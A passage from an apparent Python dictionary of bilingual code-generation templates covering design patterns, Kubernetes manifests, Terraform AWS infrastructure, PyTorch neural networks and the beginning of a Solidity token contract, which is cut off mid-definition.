    },
    
    "pattern_decorator": {
        "patterns": ["decorator pattern", "design pattern decorator", "décorateur"],
        "template": """# ===== Decorator Pattern =====
from abc import ABC, abstractmethod

class Component(ABC):
    @abstractmethod
    def operation(self) -> str:
        pass

class ConcreteComponent(Component):
    def operation(self) -> str:
        return "ConcreteComponent"

class Decorator(Component):
    def __init__(self, component: Component):
        self._component = component
    
    def operation(self) -> str:
        return self._component.operation()

class ConcreteDecoratorA(Decorator):
    def operation(self) -> str:
        return f"ConcreteDecoratorA({self._component.operation()})"

class ConcreteDecoratorB(Decorator):
    def operation(self) -> str:
        return f"ConcreteDecoratorB({self._component.operation()})"

# Utilisation
component = ConcreteComponent()
print("1:", component.operation())

decorated_a = ConcreteDecoratorA(component)
print("2:", decorated_a.operation())

decorated_b = ConcreteDecoratorB(decorated_a)
print("3:", decorated_b.operation())
"""
    },
    
    "pattern_builder": {
        "patterns": ["builder pattern", "design pattern builder", "constructeur"],
        "template": """# ===== Builder Pattern =====
from typing import Optional

class Product:
    def __init__(self):
        self.parts = []
    
    def add(self, part: str):
        self.parts.append(part)
    
    def show(self):
        print(f"Product parts: {', '.join(self.parts)}")

class Builder:
    def __init__(self):
        self.reset()
    
    def reset(self):
        self._product = Product()
    
    @property
    def product(self) -> Product:
        product = self._product
        self.reset()
        return product
    
    def build_part_a(self) -> 'Builder':
        self._product.add("PartA")
        return self
    
    def build_part_b(self) -> 'Builder':
        self._product.add("PartB")
        return self
    
    def build_part_c(self) -> 'Builder':
        self._product.add("PartC")
        return self
    
    def build(self) -> Product:
        return self.product

class Director:
    def __init__(self, builder: Builder):
        self._builder = builder
    
    def construct_minimal_product(self):
        self._builder.build_part_a()
    
    def construct_full_product(self):
        self._builder.build_part_a().build_part_b().build_part_c()

# Utilisation
builder = Builder()
director = Director(builder)

# Construction minimale
director.construct_minimal_product()
product1 = builder.build()
product1.show()

# Construction complète
director.construct_full_product()
product2 = builder.build()
product2.show()

# Construction personnalisée (fluent interface)
product3 = Builder().build_part_a().build_part_c().build()
product3.show()
"""
    },
    
    # ========================================
    # KUBERNETES - 10 TEMPLATES
    # ========================================
    
    "kubernetes_deployment_complete": {
        "patterns": ["kubernetes deployment", "k8s deployment", "déploiement kubernetes"],
        "template": """# ===== Kubernetes Deployment Complet =====
apiVersion: apps/v1
kind: Deployment
metadata:
  name: app-deployment
  namespace: production
  labels:
    app: myapp
    version: v1.0.0
    environment: production
  annotations:
    description: "Application principale"
    contact: "devops@example.com"
spec:
  replicas: 3
  revisionHistoryLimit: 10
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
        version: v1.0.0
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
        prometheus.io/path: "/metrics"
    spec:
      serviceAccountName: myapp-sa
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 2000
      
      # Init containers
      initContainers:
      - name: init-db
        image: busybox:1.35
        command: ['sh', '-c', 'until nc -z db-service 5432; do echo waiting for db; sleep 2; done;']
      
      # Application containers
      containers:
      - name: app
        image: myapp:1.0.0
        imagePullPolicy: IfNotPresent
        
        ports:
        - name: http
          containerPort: 8080
          protocol: TCP
        - name: metrics
          containerPort: 9090
          protocol: TCP
        
        env:
        - name: NODE_ENV
          value: "production"
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: db-credentials
              key: url
        - name: API_KEY
          valueFrom:
            secretKeyRef:
              name: api-secrets
              key: api-key
        - name: CACHE_HOST
          valueFrom:
            configMapKeyRef:
              name: app-config
              key: redis-host
        
        # Resource limits
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
        
        # Liveness probe
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
          timeoutSeconds: 5
          failureThreshold: 3
        
        # Readiness probe
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 10
          periodSeconds: 5
          timeoutSeconds: 3
          failureThreshold: 3
        
        # Startup probe
        startupProbe:
          httpGet:
            path: /startup
            port: 8080
          initialDelaySeconds: 0
          periodSeconds: 5
          failureThreshold: 30
        
        # Volume mounts
        volumeMounts:
        - name: config
          mountPath: /app/config
          readOnly: true
        - name: cache
          mountPath: /app/cache
        - name: logs
          mountPath: /var/log/app
      
      # Sidecar container (logs)
      - name: log-forwarder
        image: fluent/fluent-bit:2.0
        volumeMounts:
        - name: logs
          mountPath: /var/log/app
          readOnly: true
        - name: fluent-bit-config
          mountPath: /fluent-bit/etc/
      
      # Volumes
      volumes:
      - name: config
        configMap:
          name: app-config
      - name: cache
        emptyDir: {}
      - name: logs
        emptyDir: {}
      - name: fluent-bit-config
        configMap:
          name: fluent-bit-config
      
      # Node affinity
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
            - matchExpressions:
              - key: node-type
                operator: In
                values:
                - worker
        
        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
          - weight: 100
            podAffinityTerm:
              labelSelector:
                matchExpressions:
                - key: app
                  operator: In
                  values:
                  - myapp
              topologyKey: kubernetes.io/hostname
      
      # Tolerations
      tolerations:
      - key: "node.kubernetes.io/not-ready"
        operator: "Exists"
        effect: "NoExecute"
        tolerationSeconds: 300

---
# Service
apiVersion: v1
kind: Service
metadata:
  name: app-service
  namespace: production
  labels:
    app: myapp
spec:
  type: ClusterIP
  selector:
    app: myapp
  ports:
  - name: http
    port: 80
    targetPort: 8080
    protocol: TCP
  - name: metrics
    port: 9090
    targetPort: 9090
    protocol: TCP
  sessionAffinity: ClientIP
  sessionAffinityConfig:
    clientIP:
      timeoutSeconds: 10800

---
# HorizontalPodAutoscaler
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: app-hpa
  namespace: production
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: app-deployment
  minReplicas: 3
  maxReplicas: 10
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70
  - type: Resource
    resource:
      name: memory
      target:
        type: Utilization
        averageUtilization: 80
  behavior:
    scaleDown:
      stabilizationWindowSeconds: 300
      policies:
      - type: Percent
        value: 50
        periodSeconds: 60
    scaleUp:
      stabilizationWindowSeconds: 0
      policies:
      - type: Percent
        value: 100
        periodSeconds: 15
      - type: Pods
        value: 4
        periodSeconds: 15
      selectPolicy: Max

---
# ConfigMap
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
  namespace: production
data:
  redis-host: "redis-service:6379"
  log-level: "info"
  max-connections: "100"

---
# Secret (base64 encoded)
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
  namespace: production
type: Opaque
data:
  url: cG9zdGdyZXNxbDovL3VzZXI6cGFzc0BkYi1zZXJ2aWNlOjU0MzIvZGJuYW1l
  username: dXNlcg==
  password: cGFzcw==

---
# ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp-sa
  namespace: production

---
# NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: app-network-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: myapp
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: production
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 5432  # PostgreSQL
    - protocol: TCP
      port: 6379  # Redis
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 53  # DNS
    - protocol: UDP
      port: 53

---
# Ingress
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: app-ingress
  namespace: production
  annotations:
    kubernetes.io/ingress.class: "nginx"
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
    nginx.ingress.kubernetes.io/rate-limit: "100"
spec:
  tls:
  - hosts:
    - app.example.com
    secretName: app-tls-cert
  rules:
  - host: app.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: app-service
            port:
              number: 80
"""
    },
    
    # ========================================
    # TERRAFORM - 8 TEMPLATES
    # ========================================
    
    "terraform_aws_complete": {
        "patterns": ["terraform aws", "infrastructure as code", "terraform complete"],
        "template": """# ===== Terraform AWS Infrastructure Complète =====

# ========================================
# PROVIDER & BACKEND
# ========================================

terraform {
  required_version = ">= 1.5.0"
  
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
  
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-lock"
  }
}

provider "aws" {
  region = var.aws_region
  
  default_tags {
    tags = {
      Environment = var.environment
      Project     = var.project_name
      ManagedBy   = "Terraform"
    }
  }
}

# ========================================
# VARIABLES
# ========================================

variable "aws_region" {
  description = "AWS region"
  type        = string
  default     = "us-east-1"
}

variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

variable "project_name" {
  description = "Project name"
  type        = string
  default     = "myapp"
}

variable "vpc_cidr" {
  description = "VPC CIDR block"
  type        = string
  default     = "10.0.0.0/16"
}

variable "availability_zones" {
  description = "Availability zones"
  type        = list(string)
  default     = ["us-east-1a", "us-east-1b", "us-east-1c"]
}

# ========================================
# VPC
# ========================================

resource "aws_vpc" "main" {
  cidr_block           = var.vpc_cidr
  enable_dns_hostnames = true
  enable_dns_support   = true
  
  tags = {
    Name = "${var.project_name}-vpc"
  }
}

# Internet Gateway
resource "aws_internet_gateway" "main" {
  vpc_id = aws_vpc.main.id
  
  tags = {
    Name = "${var.project_name}-igw"
  }
}

# Public Subnets
resource "aws_subnet" "public" {
  count             = length(var.availability_zones)
  vpc_id            = aws_vpc.main.id
  cidr_block        = cidrsubnet(var.vpc_cidr, 8, count.index)
  availability_zone = var.availability_zones[count.index]
  
  map_public_ip_on_launch = true
  
  tags = {
    Name = "${var.project_name}-public-${var.availability_zones[count.index]}"
    Type = "public"
  }
}

# Private Subnets
resource "aws_subnet" "private" {
  count             = length(var.availability_zones)
  vpc_id            = aws_vpc.main.id
  cidr_block        = cidrsubnet(var.vpc_cidr, 8, count.index + 10)
  availability_zone = var.availability_zones[count.index]
  
  tags = {
    Name = "${var.project_name}-private-${var.availability_zones[count.index]}"
    Type = "private"
  }
}

# NAT Gateway
resource "aws_eip" "nat" {
  count  = length(var.availability_zones)
  domain = "vpc"
  
  tags = {
    Name = "${var.project_name}-nat-eip-${count.index + 1}"
  }
}

resource "aws_nat_gateway" "main" {
  count         = length(var.availability_zones)
  allocation_id = aws_eip.nat[count.index].id
  subnet_id     = aws_subnet.public[count.index].id
  
  tags = {
    Name = "${var.project_name}-nat-${count.index + 1}"
  }
  
  depends_on = [aws_internet_gateway.main]
}

# Route Tables
resource "aws_route_table" "public" {
  vpc_id = aws_vpc.main.id
  
  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.main.id
  }
  
  tags = {
    Name = "${var.project_name}-public-rt"
  }
}

resource "aws_route_table" "private" {
  count  = length(var.availability_zones)
  vpc_id = aws_vpc.main.id
  
  route {
    cidr_block     = "0.0.0.0/0"
    nat_gateway_id = aws_nat_gateway.main[count.index].id
  }
  
  tags = {
    Name = "${var.project_name}-private-rt-${count.index + 1}"
  }
}

# Route Table Associations
resource "aws_route_table_association" "public" {
  count          = length(var.availability_zones)
  subnet_id      = aws_subnet.public[count.index].id
  route_table_id = aws_route_table.public.id
}

resource "aws_route_table_association" "private" {
  count          = length(var.availability_zones)
  subnet_id      = aws_subnet.private[count.index].id
  route_table_id = aws_route_table.private[count.index].id
}

# ========================================
# SECURITY GROUPS
# ========================================

resource "aws_security_group" "alb" {
  name        = "${var.project_name}-alb-sg"
  description = "Security group for ALB"
  vpc_id      = aws_vpc.main.id
  
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
  
  tags = {
    Name = "${var.project_name}-alb-sg"
  }
}

resource "aws_security_group" "app" {
  name        = "${var.project_name}-app-sg"
  description = "Security group for application"
  vpc_id      = aws_vpc.main.id
  
  ingress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.alb.id]
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
  
  tags = {
    Name = "${var.project_name}-app-sg"
  }
}

# ========================================
# APPLICATION LOAD BALANCER
# ========================================

resource "aws_lb" "main" {
  name               = "${var.project_name}-alb"
  internal           = false
  load_balancer_type = "application"
  security_groups    = [aws_security_group.alb.id]
  subnets            = aws_subnet.public[*].id
  
  enable_deletion_protection = true
  enable_http2              = true
  enable_cross_zone_load_balancing = true
  
  tags = {
    Name = "${var.project_name}-alb"
  }
}

resource "aws_lb_target_group" "app" {
  name     = "${var.project_name}-tg"
  port     = 8080
  protocol = "HTTP"
  vpc_id   = aws_vpc.main.id
  
  health_check {
    enabled             = true
    healthy_threshold   = 2
    unhealthy_threshold = 2
    timeout             = 5
    interval            = 30
    path                = "/health"
    matcher             = "200"
  }
  
  deregistration_delay = 30
  
  tags = {
    Name = "${var.project_name}-tg"
  }
}

resource "aws_lb_listener" "http" {
  load_balancer_arn = aws_lb.main.arn
  port              = "80"
  protocol          = "HTTP"
  
  default_action {
    type = "redirect"
    
    redirect {
      port        = "443"
      protocol    = "HTTPS"
      status_code = "HTTP_301"
    }
  }
}

# ========================================
# OUTPUTS
# ========================================

output "vpc_id" {
  description = "VPC ID"
  value       = aws_vpc.main.id
}

output "public_subnet_ids" {
  description = "Public subnet IDs"
  value       = aws_subnet.public[*].id
}

output "private_subnet_ids" {
  description = "Private subnet IDs"
  value       = aws_subnet.private[*].id
}

output "alb_dns_name" {
  description = "ALB DNS name"
  value       = aws_lb.main.dns_name
}
"""
    },
    
    # ========================================
    # MACHINE LEARNING / AI - 15 TEMPLATES
    # ========================================
    
    "ml_neural_network_pytorch": {
        "patterns": ["neural network pytorch", "réseau neuronal pytorch", "deep learning pytorch"],
        "template": """# ===== Neural Network avec PyTorch =====
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import Dataset, DataLoader
import numpy as np
from typing import Tuple, List

class CustomDataset(Dataset):
    \"\"\"Dataset personnalisé pour PyTorch.\"\"\"
    
    def __init__(self, X: np.ndarray, y: np.ndarray):
        self.X = torch.FloatTensor(X)
        self.y = torch.LongTensor(y)
    
    def __len__(self) -> int:
        return len(self.X)
    
    def __getitem__(self, idx: int) -> Tuple[torch.Tensor, torch.Tensor]:
        return self.X[idx], self.y[idx]

class NeuralNetwork(nn.Module):
    \"\"\"
    Réseau de neurones profond avec dropout et batch normalization.
    \"\"\"
    
    def __init__(
        self,
        input_size: int,
        hidden_sizes: List[int],
        output_size: int,
        dropout_rate: float = 0.5
    ):
        super(NeuralNetwork, self).__init__()
        
        layers = []
        prev_size = input_size
        
        # Couches cachées
        for hidden_size in hidden_sizes:
            layers.append(nn.Linear(prev_size, hidden_size))
            layers.append(nn.BatchNorm1d(hidden_size))
            layers.append(nn.ReLU())
            layers.append(nn.Dropout(dropout_rate))
            prev_size = hidden_size
        
        # Couche de sortie
        layers.append(nn.Linear(prev_size, output_size))
        
        self.network = nn.Sequential(*layers)
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        return self.network(x)

class Trainer:
    \"\"\"Classe pour entraîner le modèle.\"\"\"
    
    def __init__(
        self,
        model: nn.Module,
        criterion: nn.Module,
        optimizer: optim.Optimizer,
        device: str = 'cuda' if torch.cuda.is_available() else 'cpu'
    ):
        self.model = model.to(device)
        self.criterion = criterion
        self.optimizer = optimizer
        self.device = device
        self.history = {
            'train_loss': [],
            'train_acc': [],
            'val_loss': [],
            'val_acc': []
        }
    
    def train_epoch(self, dataloader: DataLoader) -> Tuple[float, float]:
        \"\"\"Entraîne le modèle pour une epoch.\"\"\"
        self.model.train()
        total_loss = 0.0
        correct = 0
        total = 0
        
        for X_batch, y_batch in dataloader:
            X_batch = X_batch.to(self.device)
            y_batch = y_batch.to(self.device)
            
            # Forward pass
            outputs = self.model(X_batch)
            loss = self.criterion(outputs, y_batch)
            
            # Backward pass
            self.optimizer.zero_grad()
            loss.backward()
            self.optimizer.step()
            
            # Statistiques
            total_loss += loss.item()
            _, predicted = torch.max(outputs.data, 1)
            total += y_batch.size(0)
            correct += (predicted == y_batch).sum().item()
        
        avg_loss = total_loss / len(dataloader)
        accuracy = 100 * correct / total
        
        return avg_loss, accuracy
    
    def validate(self, dataloader: DataLoader) -> Tuple[float, float]:
        \"\"\"Valide le modèle.\"\"\"
        self.model.eval()
        total_loss = 0.0
        correct = 0
        total = 0
        
        with torch.no_grad():
            for X_batch, y_batch in dataloader:
                X_batch = X_batch.to(self.device)
                y_batch = y_batch.to(self.device)
                
                outputs = self.model(X_batch)
                loss = self.criterion(outputs, y_batch)
                
                total_loss += loss.item()
                _, predicted = torch.max(outputs.data, 1)
                total += y_batch.size(0)
                correct += (predicted == y_batch).sum().item()
        
        avg_loss = total_loss / len(dataloader)
        accuracy = 100 * correct / total
        
        return avg_loss, accuracy
    
    def fit(
        self,
        train_loader: DataLoader,
        val_loader: DataLoader,
        epochs: int,
        early_stopping_patience: int = 10
    ):
        \"\"\"Entraîne le modèle avec early stopping.\"\"\"
        best_val_loss = float('inf')
        patience_counter = 0
        
        for epoch in range(epochs):
            # Entraînement
            train_loss, train_acc = self.train_epoch(train_loader)
            
            # Validation
            val_loss, val_acc = self.validate(val_loader)
            
            # Sauvegarder l'historique
            self.history['train_loss'].append(train_loss)
            self.history['train_acc'].append(train_acc)
            self.history['val_loss'].append(val_loss)
            self.history['val_acc'].append(val_acc)
            
            print(f"Epoch {epoch+1}/{epochs}")
            print(f"  Train Loss: {train_loss:.4f}, Train Acc: {train_acc:.2f}%")
            print(f"  Val Loss: {val_loss:.4f}, Val Acc: {val_acc:.2f}%")
            
            # Early stopping
            if val_loss < best_val_loss:
                best_val_loss = val_loss
                patience_counter = 0
                torch.save(self.model.state_dict(), 'best_model.pth')
            else:
                patience_counter += 1
                if patience_counter >= early_stopping_patience:
                    print(f"Early stopping à l'epoch {epoch+1}")
                    break
        
        # Charger le meilleur modèle
        self.model.load_state_dict(torch.load('best_model.pth'))
    
    def predict(self, X: np.ndarray) -> np.ndarray:
        \"\"\"Fait des prédictions.\"\"\"
        self.model.eval()
        X_tensor = torch.FloatTensor(X).to(self.device)
        
        with torch.no_grad():
            outputs = self.model(X_tensor)
            _, predicted = torch.max(outputs.data, 1)
        
        return predicted.cpu().numpy()

# Exemple d'utilisation
if __name__ == "__main__":
    # Données d'exemple
    X_train = np.random.randn(1000, 20)
    y_train = np.random.randint(0, 3, 1000)
    X_val = np.random.randn(200, 20)
    y_val = np.random.randint(0, 3, 200)
    
    # Datasets
    train_dataset = CustomDataset(X_train, y_train)
    val_dataset = CustomDataset(X_val, y_val)
    
    # DataLoaders
    train_loader = DataLoader(train_dataset, batch_size=32, shuffle=True)
    val_loader = DataLoader(val_dataset, batch_size=32)
    
    # Modèle
    model = NeuralNetwork(
        input_size=20,
        hidden_sizes=[128, 64, 32],
        output_size=3,
        dropout_rate=0.3
    )
    
    # Entraînement
    criterion = nn.CrossEntropyLoss()
    optimizer = optim.Adam(model.parameters(), lr=0.001)
    
    trainer = Trainer(model, criterion, optimizer)
    trainer.fit(train_loader, val_loader, epochs=100, early_stopping_patience=10)
    
    # Prédictions
    predictions = trainer.predict(X_val)
    print(f"\\nPrédictions: {predictions[:10]}")
"""
    },
    
    "ml_computer_vision_cnn": {
        "patterns": ["cnn pytorch", "computer vision", "vision par ordinateur", "convnet"],
        "template": """# ===== CNN pour Computer Vision avec PyTorch =====
import torch
import torch.nn as nn
import torch.nn.functional as F
import torchvision
import torchvision.transforms as transforms
from torch.utils.data import DataLoader
import matplotlib.pyplot as plt
import numpy as np

class ConvolutionalNeuralNetwork(nn.Module):
    \"\"\"
    CNN avancé avec residual connections et attention.
    \"\"\"
    
    def __init__(self, num_classes: int = 10):
        super(ConvolutionalNeuralNetwork, self).__init__()
        
        # Bloc convolutionnel 1
        self.conv1 = nn.Sequential(
            nn.Conv2d(3, 64, kernel_size=3, padding=1),
            nn.BatchNorm2d(64),
            nn.ReLU(),
            nn.Conv2d(64, 64, kernel_size=3, padding=1),
            nn.BatchNorm2d(64),
            nn.ReLU(),
            nn.MaxPool2d(kernel_size=2, stride=2)
        )
        
        # Bloc convolutionnel 2
        self.conv2 = nn.Sequential(
            nn.Conv2d(64, 128, kernel_size=3, padding=1),
            nn.BatchNorm2d(128),
            nn.ReLU(),
            nn.Conv2d(128, 128, kernel_size=3, padding=1),
            nn.BatchNorm2d(128),
            nn.ReLU(),
            nn.MaxPool2d(kernel_size=2, stride=2)
        )
        
        # Bloc convolutionnel 3
        self.conv3 = nn.Sequential(
            nn.Conv2d(128, 256, kernel_size=3, padding=1),
            nn.BatchNorm2d(256),
            nn.ReLU(),
            nn.Conv2d(256, 256, kernel_size=3, padding=1),
            nn.BatchNorm2d(256),
            nn.ReLU(),
            nn.Conv2d(256, 256, kernel_size=3, padding=1),
            nn.BatchNorm2d(256),
            nn.ReLU(),
            nn.MaxPool2d(kernel_size=2, stride=2)
        )
        
        # Attention mechanism
        self.attention = nn.Sequential(
            nn.AdaptiveAvgPool2d((1, 1)),
            nn.Flatten(),
            nn.Linear(256, 256 // 16),
            nn.ReLU(),
            nn.Linear(256 // 16, 256),
            nn.Sigmoid()
        )
        
        # Global Average Pooling
        self.gap = nn.AdaptiveAvgPool2d((1, 1))
        
        # Fully Connected Layers
        self.fc = nn.Sequential(
            nn.Flatten(),
            nn.Linear(256, 512),
            nn.ReLU(),
            nn.Dropout(0.5),
            nn.Linear(512, num_classes)
        )
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        # Convolutions
        x = self.conv1(x)
        x = self.conv2(x)
        x = self.conv3(x)
        
        # Attention
        attention_weights = self.attention(x)
        attention_weights = attention_weights.view(x.size(0), x.size(1), 1, 1)
        x = x * attention_weights
        
        # Classification
        x = self.fc(x)
        
        return x

class ResidualBlock(nn.Module):
    \"\"\"Bloc résiduel pour ResNet.\"\"\"
    
    def __init__(self, in_channels: int, out_channels: int, stride: int = 1):
        super(ResidualBlock, self).__init__()
        
        self.conv1 = nn.Conv2d(in_channels, out_channels, kernel_size=3, 
                               stride=stride, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(out_channels)
        
        self.conv2 = nn.Conv2d(out_channels, out_channels, kernel_size=3,
                               stride=1, padding=1, bias=False)
        self.bn2 = nn.BatchNorm2d(out_channels)
        
        self.shortcut = nn.Sequential()
        if stride != 1 or in_channels != out_channels:
            self.shortcut = nn.Sequential(
                nn.Conv2d(in_channels, out_channels, kernel_size=1,
                         stride=stride, bias=False),
                nn.BatchNorm2d(out_channels)
            )
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        residual = x
        
        out = F.relu(self.bn1(self.conv1(x)))
        out = self.bn2(self.conv2(out))
        
        out += self.shortcut(residual)
        out = F.relu(out)
        
        return out

class ResNet(nn.Module):
    \"\"\"ResNet-18 implémentation.\"\"\"
    
    def __init__(self, num_classes: int = 10):
        super(ResNet, self).__init__()
        
        self.conv1 = nn.Sequential(
            nn.Conv2d(3, 64, kernel_size=7, stride=2, padding=3, bias=False),
            nn.BatchNorm2d(64),
            nn.ReLU(),
            nn.MaxPool2d(kernel_size=3, stride=2, padding=1)
        )
        
        self.layer1 = self._make_layer(64, 64, 2, stride=1)
        self.layer2 = self._make_layer(64, 128, 2, stride=2)
        self.layer3 = self._make_layer(128, 256, 2, stride=2)
        self.layer4 = self._make_layer(256, 512, 2, stride=2)
        
        self.avg_pool = nn.AdaptiveAvgPool2d((1, 1))
        self.fc = nn.Linear(512, num_classes)
    
    def _make_layer(self, in_channels: int, out_channels: int, 
                   num_blocks: int, stride: int) -> nn.Sequential:
        layers = []
        layers.append(ResidualBlock(in_channels, out_channels, stride))
        
        for _ in range(1, num_blocks):
            layers.append(ResidualBlock(out_channels, out_channels))
        
        return nn.Sequential(*layers)
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        x = self.conv1(x)
        x = self.layer1(x)
        x = self.layer2(x)
        x = self.layer3(x)
        x = self.layer4(x)
        x = self.avg_pool(x)
        x = torch.flatten(x, 1)
        x = self.fc(x)
        return x

class ImageClassifier:
    \"\"\"Wrapper pour entraîner et utiliser le CNN.\"\"\"
    
    def __init__(self, model: nn.Module, device: str = 'cuda'):
        self.model = model.to(device)
        self.device = device
    
    def train_model(
        self,
        train_loader: DataLoader,
        val_loader: DataLoader,
        epochs: int = 10,
        learning_rate: float = 0.001
    ):
        criterion = nn.CrossEntropyLoss()
        optimizer = torch.optim.Adam(self.model.parameters(), lr=learning_rate)
        scheduler = torch.optim.lr_scheduler.ReduceLROnPlateau(
            optimizer, mode='min', factor=0.5, patience=3
        )
        
        best_val_acc = 0.0
        
        for epoch in range(epochs):
            # Training
            self.model.train()
            train_loss = 0.0
            train_correct = 0
            train_total = 0
            
            for images, labels in train_loader:
                images, labels = images.to(self.device), labels.to(self.device)
                
                optimizer.zero_grad()
                outputs = self.model(images)
                loss = criterion(outputs, labels)
                loss.backward()
                optimizer.step()
                
                train_loss += loss.item()
                _, predicted = outputs.max(1)
                train_total += labels.size(0)
                train_correct += predicted.eq(labels).sum().item()
            
            train_acc = 100. * train_correct / train_total
            
            # Validation
            val_loss, val_acc = self.validate(val_loader, criterion)
            
            # Scheduler
            scheduler.step(val_loss)
            
            print(f"Epoch {epoch+1}/{epochs}")
            print(f"  Train Loss: {train_loss/len(train_loader):.4f}, Acc: {train_acc:.2f}%")
            print(f"  Val Loss: {val_loss:.4f}, Acc: {val_acc:.2f}%")
            
            if val_acc > best_val_acc:
                best_val_acc = val_acc
                torch.save(self.model.state_dict(), 'best_cnn_model.pth')
    
    def validate(self, dataloader: DataLoader, criterion) -> tuple:
        self.model.eval()
        val_loss = 0.0
        correct = 0
        total = 0
        
        with torch.no_grad():
            for images, labels in dataloader:
                images, labels = images.to(self.device), labels.to(self.device)
                outputs = self.model(images)
                loss = criterion(outputs, labels)
                
                val_loss += loss.item()
                _, predicted = outputs.max(1)
                total += labels.size(0)
                correct += predicted.eq(labels).sum().item()
        
        return val_loss / len(dataloader), 100. * correct / total
    
    def predict(self, image: torch.Tensor) -> int:
        self.model.eval()
        with torch.no_grad():
            image = image.unsqueeze(0).to(self.device)
            output = self.model(image)
            _, predicted = output.max(1)
        return predicted.item()

# Exemple d'utilisation
if __name__ == "__main__":
    # Transformations
    transform = transforms.Compose([
        transforms.RandomHorizontalFlip(),
        transforms.RandomCrop(32, padding=4),
        transforms.ToTensor(),
        transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))
    ])
    
    # Dataset CIFAR-10
    train_dataset = torchvision.datasets.CIFAR10(
        root='./data', train=True, download=True, transform=transform
    )
    test_dataset = torchvision.datasets.CIFAR10(
        root='./data', train=False, download=True, transform=transform
    )
    
    train_loader = DataLoader(train_dataset, batch_size=128, shuffle=True)
    test_loader = DataLoader(test_dataset, batch_size=128, shuffle=False)
    
    # Modèle
    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    model = ResNet(num_classes=10)
    
    # Entraînement
    classifier = ImageClassifier(model, device)
    classifier.train_model(train_loader, test_loader, epochs=50)
"""
    },
    
    # ========================================
    # BLOCKCHAIN / WEB3 - 10 TEMPLATES
    # ========================================
    
    "blockchain_smart_contract_solidity": {
        "patterns": ["smart contract solidity", "contrat intelligent", "ethereum solidity"],
        "template": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ===== Smart Contract Complet avec Sécurité =====

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/// @title Token ERC20 Avancé
/// @author Namz IA
/// @notice Implémente un token ERC20 avec gouvernance
contract AdvancedToken is ERC20, AccessControl, Pausable, ReentrancyGuard {
    // ========================================
    // CONSTANTS & VARIABLES
    // ========================================
    
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    
    uint256 public constant MAX_SUPPLY = 1_000_000_000 * 10**18; // 1 milliard
    uint256 public constant INITIAL_SUPPLY = 100_000_000 * 10**18; // 100 millions
    
    mapping(address => bool) public blacklist;
    mapping(address => uint256) public lastTransferTime;
    
    uint256 public transferCooldown = 1 minutes;
    uint256 public transferFee = 100; // 1% (base 10000)
    address public feeRecipient;
    
    // ========================================
    // EVENTS
    // ========================================
    
    event Blacklisted(address indexed account);
    event Unblacklisted(address indexed account);
    event FeeUpdated(uint256 newFee);
    event FeeRecipientUpdated(address indexed newRecipient);
    event TokensBurned(address indexed burner, uint256 amount);
    event TokensMinted(address indexed recipient, uint256 amount);
    
    // ========================================
    // MODIFIERS
    // ========================================
    
    modifier notBlacklisted(address account) {
        require(!blacklist[account], "Account is blacklisted");
